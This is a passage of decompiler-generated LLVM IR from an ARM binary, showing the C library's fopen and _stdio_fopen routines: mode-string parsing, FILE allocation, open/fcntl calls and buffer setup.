  store i32 %v2_17adc, i32* @r4, align 4
  store i32 %v6_177c4, i32* @r5, align 4
  store i32 %v9_177c4, i32* @r6, align 4
  store i32 %v12_177c4, i32* @r7, align 4
  ret i32 %v0_17ad4

; uselistorder directives
  uselistorder i32 %v0_17aa4, { 1, 0, 2 }
  uselistorder i32 %v1_17a88.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17a78, { 1, 0 }
  uselistorder i32 %v0_17a4c, { 1, 0 }
  uselistorder i32 %v0_17a34, { 1, 0, 2 }
  uselistorder i32 %v1_17a18.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17a00, { 1, 0 }
  uselistorder i32 %v0_179b8, { 1, 0, 2 }
  uselistorder i32 %v1_1799c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1792c, { 1, 0, 2 }
  uselistorder i32 %v1_17910.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17900, { 1, 0 }
  uselistorder i32 %v0_178bc, { 1, 0, 2 }
  uselistorder i32 %v1_178a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17880, { 1, 0 }
  uselistorder i32 %v1_1780c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 30, 29, 34, 33, 28, 32, 31, 27, 26, 25, 24, 23, 9, 8, 7, 6, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_17ad0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17aa8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a90, { 1, 0 }
  uselistorder label %dec_label_pc_17a48, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_17a38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a20, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_179e4, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_179bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_179a4, { 1, 0 }
  uselistorder label %dec_label_pc_17958, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17930, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17918, { 1, 0 }
  uselistorder label %dec_label_pc_178d0, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_178c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_178a8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_17848, { 1, 0 }
  uselistorder label %dec_label_pc_1783c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1782c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17814, { 1, 0 }
}

define i32 @function_17ae8(i32 %arg1) local_unnamed_addr {
dec_label_pc_17ae8:
  %v0_17ae8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17ae8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17ae8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17ae8, %bb
  %v10_17af0 = phi i32 [ %arg1, %dec_label_pc_17ae8 ], [ 0, %bb ]
  ret i32 %v10_17af0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_17b04 = call i32 @_stdio_fopen()
  ret i32 %v0_17b04
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_17b14 = load i32, i32* @r4, align 4
  store i32 %v3_17b14, i32* %stack_var_-24, align 4
  %v6_17b14 = load i32, i32* @r5, align 4
  %v9_17b14 = load i32, i32* @r6, align 4
  %v12_17b14 = load i32, i32* @r7, align 4
  %v15_17b14 = load i32, i32* @r8, align 4
  %v0_17b18 = load i32, i32* @r1, align 4
  %v1_17b18 = inttoptr i32 %v0_17b18 to i8*
  %v2_17b18 = load i8, i8* %v1_17b18, align 1
  %v2_17b20 = icmp ugt i8 %v2_17b18, 113
  store i1 %v2_17b20, i1* %cpsr_c.global-to-local, align 1
  %v7_17b20 = icmp eq i8 %v2_17b18, 114
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r8, align 4
  %v0_17b2c = load i32, i32* @r0, align 4
  store i32 %v0_17b2c, i32* @r7, align 4
  %v0_17b30 = load i32, i32* @r2, align 4
  store i32 %v0_17b30, i32* @r5, align 4
  %v0_17b34 = load i32, i32* @r3, align 4
  store i32 %v0_17b34, i32* @r6, align 4
  br i1 %v7_17b20, label %dec_label_pc_17b88, label %dec_label_pc_17b3c

dec_label_pc_17b3c:                               ; preds = %entry
  %v2_17b3c = icmp ugt i8 %v2_17b18, 118
  store i1 %v2_17b3c, i1* %cpsr_c.global-to-local, align 1
  %v7_17b3c = icmp eq i8 %v2_17b18, 119
  br i1 %v7_17b3c, label %bb, label %dec_label_pc_17b48

bb:                                               ; preds = %dec_label_pc_17b3c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_17b8c

dec_label_pc_17b48:                               ; preds = %dec_label_pc_17b3c
  %v2_17b48 = icmp ugt i8 %v2_17b18, 96
  store i1 %v2_17b48, i1* %cpsr_c.global-to-local, align 1
  %v7_17b48 = icmp eq i8 %v2_17b18, 97
  br i1 %v7_17b48, label %bb50, label %dec_label_pc_17b54

bb50:                                             ; preds = %dec_label_pc_17b48
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_17b8c

dec_label_pc_17b54:                               ; preds = %dec_label_pc_17b48, %dec_label_pc_17c24, %dec_label_pc_17bf8
  store i32 51480, i32* %r2.global-to-local, align 4
  %v0_17b58 = call i32 @__aeabi_read_tp()
  store i32 %v0_17b58, i32* %r0.global-to-local, align 4
  %v3_17b5c = load i16, i16* @global_var_2447c.761, align 2
  %v4_17b5c = sext i16 %v3_17b5c to i32
  store i32 %v4_17b5c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_17b64 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17b64 = icmp eq i32 %v0_17b64, 0
  %v3_17b68 = add i32 %v4_17b5c, %v0_17b58
  %v4_17b68 = inttoptr i32 %v3_17b68 to i32*
  store i32 22, i32* %v4_17b68, align 4
  br i1 %v2_17b64, label %dec_label_pc_17f2c, label %dec_label_pc_17b70

dec_label_pc_17b70:                               ; preds = %dec_label_pc_17c48._crit_edge, %dec_label_pc_17b54
  %v0_17b70 = load i32, i32* @r5, align 4
  %v1_17b70 = inttoptr i32 %v0_17b70 to i16*
  %v2_17b70 = load i16, i16* %v1_17b70, align 2
  %v3_17b70 = zext i16 %v2_17b70 to i32
  store i32 %v3_17b70, i32* %r3.global-to-local, align 4
  %v1_17b74 = and i32 %v3_17b70, 8192
  %v2_17b74 = icmp eq i32 %v1_17b74, 0
  br i1 %v2_17b74, label %dec_label_pc_17f2c, label %dec_label_pc_17b7c

dec_label_pc_17b7c:                               ; preds = %dec_label_pc_17b70
  store i32 %v0_17b70, i32* @r0, align 4
  %v0_17b80 = call i32 @free()
  store i32 %v0_17b80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f2c

dec_label_pc_17b88:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_17b8c

dec_label_pc_17b8c:                               ; preds = %bb, %bb50, %dec_label_pc_17b88
  %v1_17ba4 = phi i32 [ 1089, %bb50 ], [ 577, %bb ], [ 1, %dec_label_pc_17b88 ]
  %v1_17b8c = add i32 %v0_17b18, 1
  %v2_17b8c = inttoptr i32 %v1_17b8c to i8*
  %v3_17b8c = load i8, i8* %v2_17b8c, align 1
  %v2_17b90 = icmp ugt i8 %v3_17b8c, 97
  store i1 %v2_17b90, i1* %cpsr_c.global-to-local, align 1
  %v7_17b90 = icmp eq i8 %v3_17b8c, 98
  %v1_17b8c.v0_17b18 = select i1 %v7_17b90, i32 %v1_17b8c, i32 %v0_17b18
  store i32 %v1_17b8c.v0_17b18, i32* %r3.global-to-local, align 4
  %v1_17b9c = add i32 %v1_17b8c.v0_17b18, 1
  %v2_17b9c = inttoptr i32 %v1_17b9c to i8*
  %v3_17b9c = load i8, i8* %v2_17b9c, align 1
  %v4_17b9c = zext i8 %v3_17b9c to i32
  store i32 %v4_17b9c, i32* @r3, align 4
  %v2_17ba0 = icmp ugt i8 %v3_17b9c, 42
  store i1 %v2_17ba0, i1* %cpsr_c.global-to-local, align 1
  %v7_17ba0 = icmp eq i8 %v3_17b9c, 43
  br i1 %v7_17ba0, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_17b8c
  store i32 %v1_17ba4, i32* @r3, align 4
  %v2_17ba8 = add nuw nsw i32 %v1_17ba4, 1
  store i32 %v2_17ba8, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17b8c, %bb53
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17bac = icmp eq i32 %v0_17b30, 0
  br i1 %v2_17bac, label %dec_label_pc_17bb4, label %dec_label_pc_17bf0

dec_label_pc_17bb4:                               ; preds = %.thread4
  store i32 68, i32* @r0, align 4
  %v0_17bb8 = call i32 @malloc()
  store i32 %v0_17bb8, i32* %r0.global-to-local, align 4
  store i32 %v0_17bb8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_17bbc = icmp eq i32 %v0_17bb8, 0
  br i1 %v3_17bbc, label %dec_label_pc_17f30, label %dec_label_pc_17bc4

dec_label_pc_17bc4:                               ; preds = %dec_label_pc_17bb4
  %v0_17bc8 = load i32, i32* @r8, align 4
  %v2_17bc8 = add i32 %v0_17bc8, -33136
  store i32 %v2_17bc8, i32* %r3.global-to-local, align 4
  %v1_17bcc = inttoptr i32 %v2_17bc8 to i32*
  %v2_17bcc = load i32, i32* %v1_17bcc, align 4
  store i32 %v2_17bcc, i32* %r0.global-to-local, align 4
  %v3_17bcc = add i32 %v0_17bc8, -33132
  %v4_17bcc = inttoptr i32 %v3_17bcc to i32*
  %v5_17bcc = load i32, i32* %v4_17bcc, align 4
  store i32 %v5_17bcc, i32* @r1, align 4
  %v6_17bcc = add i32 %v0_17bc8, -33128
  %v7_17bcc = inttoptr i32 %v6_17bcc to i32*
  %v8_17bcc = load i32, i32* %v7_17bcc, align 4
  store i32 %v8_17bcc, i32* %r2.global-to-local, align 4
  %v2_17bd8 = add i32 %v0_17bb8, 8
  %v3_17bd8 = inttoptr i32 %v2_17bd8 to i32*
  store i32 0, i32* %v3_17bd8, align 4
  %v2_17be0 = load i32, i32* @r5, align 4
  %v3_17be0 = inttoptr i32 %v2_17be0 to i16*
  store i16 8192, i16* %v3_17be0, align 2
  %v2_17be4 = load i32, i32* %r0.global-to-local, align 4
  %v0_17be8 = load i32, i32* @r5, align 4
  %v1_17be8 = add i32 %v0_17be8, 56
  store i32 %v1_17be8, i32* @r3, align 4
  %v1_17bec = inttoptr i32 %v1_17be8 to i32*
  store i32 %v2_17be4, i32* %v1_17bec, align 4
  %v3_17bec = add i32 %v0_17be8, 60
  %v4_17bec = inttoptr i32 %v3_17bec to i32*
  %v5_17bec = load i32, i32* @r1, align 4
  store i32 %v5_17bec, i32* %v4_17bec, align 4
  %v6_17bec = add i32 %v0_17be8, 64
  %v7_17bec = inttoptr i32 %v6_17bec to i32*
  %v8_17bec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17bec, i32* %v7_17bec, align 4
  %v0_17bf0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17bf0

dec_label_pc_17bf0:                               ; preds = %.thread4, %dec_label_pc_17bc4
  %v0_17c48 = phi i32 [ %v0_17b34, %.thread4 ], [ %v0_17bf0.pre, %dec_label_pc_17bc4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17bf0 = icmp slt i32 %v0_17c48, 0
  br i1 %v1_17bf0, label %dec_label_pc_17c48, label %dec_label_pc_17bf8

dec_label_pc_17bf8:                               ; preds = %dec_label_pc_17bf0
  %v0_17bfc = load i32, i32* @r4, align 4
  %v2_17bfc = and i32 %v0_17bfc, 131075
  %v1_17c00 = add nuw nsw i32 %v2_17bfc, 1
  store i32 %v1_17c00, i32* %r2.global-to-local, align 4
  %v0_17c04 = load i32, i32* @r7, align 4
  %v1_17c04 = add i32 %v0_17c04, 1
  %v2_17c08 = and i32 %v1_17c04, %v1_17c00
  store i32 %v2_17c08, i32* %r3.global-to-local, align 4
  %v3_17c0c = icmp uge i32 %v2_17c08, %v1_17c00
  store i1 %v3_17c0c, i1* %cpsr_c.global-to-local, align 1
  %v9_17c0c = icmp eq i32 %v2_17c08, %v1_17c00
  %v1_17c10 = load i32, i32* @r5, align 4
  %v2_17c10 = add i32 %v1_17c10, 4
  %v3_17c10 = inttoptr i32 %v2_17c10 to i32*
  store i32 %v0_17c48, i32* %v3_17c10, align 4
  br i1 %v9_17c0c, label %dec_label_pc_17c18, label %dec_label_pc_17b54

dec_label_pc_17c18:                               ; preds = %dec_label_pc_17bf8
  %v0_17c18 = load i32, i32* @r4, align 4
  %v1_17c18 = load i32, i32* @r7, align 4
  %v2_17c18 = sub i32 -1, %v1_17c18
  %v3_17c18 = and i32 %v0_17c18, %v2_17c18
  store i32 %v3_17c18, i32* @r3, align 4
  %v1_17c1c = and i32 %v3_17c18, 1024
  %v2_17c1c = icmp eq i32 %v1_17c1c, 0
  br i1 %v2_17c1c, label %dec_label_pc_17c3c, label %dec_label_pc_17c24

dec_label_pc_17c24:                               ; preds = %dec_label_pc_17c18
  %v0_17c24 = load i32, i32* @r6, align 4
  store i32 %v0_17c24, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_17c30 = call i32 @__libc_fcntl(i32 %v0_17c24, i32 4)
  store i32 %v2_17c30, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17c34 = icmp eq i32 %v2_17c30, 0
  br i1 %v2_17c34, label %dec_label_pc_17c24.dec_label_pc_17c3c_crit_edge, label %dec_label_pc_17b54

dec_label_pc_17c24.dec_label_pc_17c3c_crit_edge:  ; preds = %dec_label_pc_17c24
  %v0_17c3c.pre = load i32, i32* @r7, align 4
  %v0_17c40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17c3c

dec_label_pc_17c3c:                               ; preds = %dec_label_pc_17c24.dec_label_pc_17c3c_crit_edge, %dec_label_pc_17c18
  %v0_17c40 = phi i32 [ %v0_17c40.pre, %dec_label_pc_17c24.dec_label_pc_17c3c_crit_edge ], [ %v0_17c18, %dec_label_pc_17c18 ]
  %v0_17c3c = phi i32 [ %v0_17c3c.pre, %dec_label_pc_17c24.dec_label_pc_17c3c_crit_edge ], [ %v1_17c18, %dec_label_pc_17c18 ]
  %v1_17c3c = and i32 %v0_17c3c, 131072
  store i32 %v1_17c3c, i32* %r3.global-to-local, align 4
  %v2_17c40 = or i32 %v1_17c3c, %v0_17c40
  store i32 %v2_17c40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17c6c

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17bf0
  %v2_17c48 = icmp eq i32 %v0_17c48, -1
  store i1 %v2_17c48, i1* %cpsr_c.global-to-local, align 1
  %v7_17c48 = icmp eq i32 %v0_17c48, -1
  %v0_17c54.pre = load i32, i32* @r4, align 4
  br i1 %v7_17c48, label %dec_label_pc_17c48._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_17c48
  %v2_17c4c = or i32 %v0_17c54.pre, 131072
  store i32 %v2_17c4c, i32* @r4, align 4
  br label %dec_label_pc_17c48._crit_edge

dec_label_pc_17c48._crit_edge:                    ; preds = %dec_label_pc_17c48, %bb54
  %v0_17c54 = phi i32 [ %v2_17c4c, %bb54 ], [ %v0_17c54.pre, %dec_label_pc_17c48 ]
  %v0_17c50 = load i32, i32* @r7, align 4
  store i32 %v0_17c50, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_17c5c = inttoptr i32 %v0_17c54 to i16*
  %v3_17c5c = call i32 @__libc_open(i32 %v0_17c50, i16* %v2_17c5c)
  store i32 %v3_17c5c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17c60 = icmp slt i32 %v3_17c5c, 0
  %v1_17c64 = load i32, i32* @r5, align 4
  %v2_17c64 = add i32 %v1_17c64, 4
  %v3_17c64 = inttoptr i32 %v2_17c64 to i32*
  store i32 %v3_17c5c, i32* %v3_17c64, align 4
  br i1 %v1_17c60, label %dec_label_pc_17b70, label %.dec_label_pc_17c6c_crit_edge

.dec_label_pc_17c6c_crit_edge:                    ; preds = %dec_label_pc_17c48._crit_edge
  %v0_17c70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17c6c

dec_label_pc_17c6c:                               ; preds = %.dec_label_pc_17c6c_crit_edge, %dec_label_pc_17c3c
  %v0_17c88 = phi i32 [ %v0_17c70.pre, %.dec_label_pc_17c6c_crit_edge ], [ %v2_17c40, %dec_label_pc_17c3c ]
  %v0_17c6c = load i32, i32* @r5, align 4
  %v1_17c6c = inttoptr i32 %v0_17c6c to i16*
  %v2_17c6c = load i16, i16* %v1_17c6c, align 2
  %v3_17c6c = zext i16 %v2_17c6c to i32
  %v1_17c70 = urem i32 %v0_17c88, 4
  %v1_17c74 = and i32 %v0_17c88, 1024
  %v1_17c78 = and i32 %v3_17c6c, 8192
  %v1_17c7c = add nuw nsw i32 %v1_17c70, 1
  %v2_17c80 = or i32 %v1_17c78, %v1_17c74
  store i32 %v2_17c80, i32* %r3.global-to-local, align 4
  %v1_17c84 = xor i32 %v1_17c7c, 3
  %v1_17c88 = and i32 %v0_17c88, 131072
  store i32 %v1_17c88, i32* %r2.global-to-local, align 4
  %v2_17c88 = icmp eq i32 %v1_17c88, 0
  %v1_17c8c = add i32 %v0_17c6c, 4
  %v2_17c8c = inttoptr i32 %v1_17c8c to i32*
  %v3_17c8c = load i32, i32* %v2_17c8c, align 4
  store i32 %v3_17c8c, i32* @r4, align 4
  br i1 %v2_17c88, label %bb56, label %bb55

bb55:                                             ; preds = %dec_label_pc_17c6c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_17c6c, %bb55
  %v0_17c98 = phi i32 [ 0, %dec_label_pc_17c6c ], [ 32768, %bb55 ]
  %v4_17c94 = mul nuw nsw i32 %v1_17c84, 16
  %v5_17c94 = or i32 %v2_17c80, %v4_17c94
  store i32 %v5_17c94, i32* %r3.global-to-local, align 4
  %v2_17c98 = or i32 %v0_17c98, %v5_17c94
  store i32 %v2_17c98, i32* %r2.global-to-local, align 4
  %v2_17c9c = icmp ugt i32 %v3_17c8c, 2147483646
  store i1 %v2_17c9c, i1* %cpsr_c.global-to-local, align 1
  %v8_17c9c = icmp eq i32 %v3_17c8c, 2147483647
  %v1_17ca0 = trunc i32 %v2_17c98 to i16
  store i16 %v1_17ca0, i16* %v1_17c6c, align 2
  br i1 %v8_17c9c, label %dec_label_pc_17ce0, label %dec_label_pc_17ca8

dec_label_pc_17ca8:                               ; preds = %bb56
  store i32 ptrtoint (i32* @global_var_c7c4.1023 to i32), i32* %r3.global-to-local, align 4
  %v0_17cac = call i32 @__aeabi_read_tp()
  %v3_17cb0 = load i16, i16* @global_var_2447c.761, align 2
  %v4_17cb0 = sext i16 %v3_17cb0 to i32
  store i32 %v4_17cb0, i32* @r3, align 4
  store i32 %v0_17cac, i32* @r6, align 4
  %v0_17cb8 = load i32, i32* @r4, align 4
  store i32 %v0_17cb8, i32* @r0, align 4
  %v2_17cbc = add i32 %v4_17cb0, %v0_17cac
  %v3_17cbc = inttoptr i32 %v2_17cbc to i32*
  %v4_17cbc = load i32, i32* %v3_17cbc, align 4
  store i32 %v4_17cbc, i32* @r4, align 4
  %v1_17cc0 = call i32 @isatty(i32 %v0_17cb8)
  store i32 %v1_17cc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17cc4 = icmp eq i32 %v1_17cc0, 0
  br i1 %v2_17cc4, label %.thread6, label %bb57

bb57:                                             ; preds = %dec_label_pc_17ca8
  %v1_17cc8 = load i32, i32* @r5, align 4
  %v2_17cc8 = inttoptr i32 %v1_17cc8 to i16*
  %v3_17cc8 = load i16, i16* %v2_17cc8, align 2
  %v4_17cc8 = zext i16 %v3_17cc8 to i32
  %v2_17ccc = or i32 %v4_17cc8, 256
  store i32 %v2_17ccc, i32* %r3.global-to-local, align 4
  %v2_17cd0 = trunc i32 %v2_17ccc to i16
  store i16 %v2_17cd0, i16* %v2_17cc8, align 2
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_17ca8, %bb57
  %v3_17cd8 = load i16, i16* @global_var_2447c.761, align 2
  %v4_17cd8 = sext i16 %v3_17cd8 to i32
  store i32 %v4_17cd8, i32* %r3.global-to-local, align 4
  %v0_17cdc = load i32, i32* @r4, align 4
  %v1_17cdc = load i32, i32* @r6, align 4
  %v3_17cdc = add i32 %v1_17cdc, %v4_17cd8
  %v4_17cdc = inttoptr i32 %v3_17cdc to i32*
  store i32 %v0_17cdc, i32* %v4_17cdc, align 4
  br label %dec_label_pc_17ce0

dec_label_pc_17ce0:                               ; preds = %bb56, %.thread6
  %v0_17ce0 = load i32, i32* @r5, align 4
  %v1_17ce0 = add i32 %v0_17ce0, 8
  %v2_17ce0 = inttoptr i32 %v1_17ce0 to i32*
  %v3_17ce0 = load i32, i32* %v2_17ce0, align 4
  store i32 %v3_17ce0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17ce4 = icmp eq i32 %v3_17ce0, 0
  br i1 %v2_17ce4, label %dec_label_pc_17cec, label %bb58

dec_label_pc_17cec:                               ; preds = %dec_label_pc_17ce0
  store i32 4096, i32* @r0, align 4
  %v0_17cf0 = call i32 @malloc()
  store i32 %v0_17cf0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17cf4 = icmp eq i32 %v0_17cf0, 0
  %v1_17d04.pre = load i32, i32* @r5, align 4
  br i1 %v2_17cf4, label %.thread10, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17cec
  %v2_17cf8 = inttoptr i32 %v1_17d04.pre to i16*
  %v3_17cf8 = load i16, i16* %v2_17cf8, align 2
  %v4_17cf8 = zext i16 %v3_17cf8 to i32
  %v2_17cfc = add i32 %v0_17cf0, 4096
  store i32 %v2_17cfc, i32* %r2.global-to-local, align 4
  %v2_17d00 = or i32 %v4_17cf8, 16384
  store i32 %v2_17d00, i32* %r3.global-to-local, align 4
  %v2_17d04 = add i32 %v1_17d04.pre, 8
  %v3_17d04 = inttoptr i32 %v2_17d04 to i32*
  store i32 %v0_17cf0, i32* %v3_17d04, align 4
  %v1_17d08 = load i32, i32* %r2.global-to-local, align 4
  %v2_17d08 = load i32, i32* @r5, align 4
  %v3_17d08 = add i32 %v2_17d08, 12
  %v4_17d08 = inttoptr i32 %v3_17d08 to i32*
  store i32 %v1_17d08, i32* %v4_17d08, align 4
  %v1_17d0c = load i32, i32* %r3.global-to-local, align 4
  %v2_17d0c = trunc i32 %v1_17d0c to i16
  %v3_17d0c = load i32, i32* @r5, align 4
  %v4_17d0c = inttoptr i32 %v3_17d0c to i16*
  store i16 %v2_17d0c, i16* %v4_17d0c, align 2
  br label %bb58

.thread10:                                        ; preds = %dec_label_pc_17cec
  %v2_17d0438 = add i32 %v1_17d04.pre, 8
  %v3_17d0439 = inttoptr i32 %v2_17d0438 to i32*
  store i32 0, i32* %v3_17d0439, align 4
  %v2_17d10 = load i32, i32* @r5, align 4
  %v3_17d10 = add i32 %v2_17d10, 12
  %v4_17d10 = inttoptr i32 %v3_17d10 to i32*
  store i32 0, i32* %v4_17d10, align 4
  br label %bb58

bb58:                                             ; preds = %.thread9, %dec_label_pc_17ce0, %.thread10
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_17d1c = load i32, i32* @r8, align 4
  %v2_17d1c = add i32 %v0_17d1c, 92
  %v3_17d1c = inttoptr i32 %v2_17d1c to i32*
  %v4_17d1c = load i32, i32* %v3_17d1c, align 4
  store i32 %v4_17d1c, i32* %r3.global-to-local, align 4
  %v2_17d20 = load i32, i32* @r5, align 4
  %v3_17d20 = add i32 %v2_17d20, 2
  %v4_17d20 = inttoptr i32 %v3_17d20 to i8*
  store i8 0, i8* %v4_17d20, align 1
  %v0_17d24 = load i32, i32* @r5, align 4
  %v1_17d24 = inttoptr i32 %v0_17d24 to i16*
  %v2_17d24 = load i16, i16* %v1_17d24, align 2
  %v3_17d24 = zext i16 %v2_17d24 to i32
  store i32 %v3_17d24, i32* %r2.global-to-local, align 4
  %v0_17d28 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d28 = inttoptr i32 %v0_17d28 to i32*
  %v2_17d28 = load i32, i32* %v1_17d28, align 4
  store i32 %v2_17d28, i32* @r1, align 4
  %v1_17d2c = add i32 %v0_17d24, 8
  %v2_17d2c = inttoptr i32 %v1_17d2c to i32*
  %v3_17d2c = load i32, i32* %v2_17d2c, align 4
  store i32 %v3_17d2c, i32* %r3.global-to-local, align 4
  %v1_17d30 = and i32 %v3_17d24, 8192
  %v2_17d30 = icmp eq i32 %v1_17d30, 0
  %v2_17d34 = add i32 %v0_17d24, 20
  %v3_17d34 = inttoptr i32 %v2_17d34 to i32*
  store i32 %v3_17d2c, i32* %v3_17d34, align 4
  %v0_17d38 = load i32, i32* @r1, align 4
  %v1_17d38 = load i32, i32* @r5, align 4
  %v2_17d38 = add i32 %v1_17d38, 52
  %v3_17d38 = inttoptr i32 %v2_17d38 to i32*
  store i32 %v0_17d38, i32* %v3_17d38, align 4
  %v0_17d3c = load i32, i32* %r3.global-to-local, align 4
  %v1_17d3c = load i32, i32* @r5, align 4
  %v2_17d3c = add i32 %v1_17d3c, 24
  %v3_17d3c = inttoptr i32 %v2_17d3c to i32*
  store i32 %v0_17d3c, i32* %v3_17d3c, align 4
  %v0_17d40 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d40 = load i32, i32* @r5, align 4
  %v2_17d40 = add i32 %v1_17d40, 28
  %v3_17d40 = inttoptr i32 %v2_17d40 to i32*
  store i32 %v0_17d40, i32* %v3_17d40, align 4
  %v0_17d44 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d44 = load i32, i32* @r5, align 4
  %v2_17d44 = add i32 %v1_17d44, 16
  %v3_17d44 = inttoptr i32 %v2_17d44 to i32*
  store i32 %v0_17d44, i32* %v3_17d44, align 4
  %v0_17d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_17d48 = load i32, i32* @r5, align 4
  %v2_17d48 = add i32 %v1_17d48, 44
  %v3_17d48 = inttoptr i32 %v2_17d48 to i32*
  store i32 %v0_17d48, i32* %v3_17d48, align 4
  br i1 %v2_17d30, label %dec_label_pc_17f30, label %dec_label_pc_17d50

dec_label_pc_17d50:                               ; preds = %bb58
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17d54 = load i32, i32* @r8, align 4
  %v2_17d54 = add i32 %v0_17d54, 160
  %v3_17d54 = inttoptr i32 %v2_17d54 to i32*
  %v4_17d54 = load i32, i32* %v3_17d54, align 4
  store i32 %v4_17d54, i32* %r7.global-to-local, align 4
  %v0_17d58 = call i32 @__aeabi_read_tp()
  store i32 %v0_17d58, i32* %r0.global-to-local, align 4
  %v1_17d5c = add i32 %v4_17d54, 8
  %v2_17d5c = inttoptr i32 %v1_17d5c to i32*
  %v3_17d5c = load i32, i32* %v2_17d5c, align 4
  store i32 %v3_17d5c, i32* %r3.global-to-local, align 4
  %v1_17d60 = add i32 %v0_17d58, -1168
  store i32 %v1_17d60, i32* %r6.global-to-local, align 4
  %v3_17d64 = icmp uge i32 %v3_17d5c, %v1_17d60
  store i1 %v3_17d64, i1* %cpsr_c.global-to-local, align 1
  %v9_17d64 = icmp eq i32 %v3_17d5c, %v1_17d60
  br i1 %v9_17d64, label %dec_label_pc_17da8, label %dec_label_pc_17d6c

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d50
  store i32 %v4_17d54, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d74

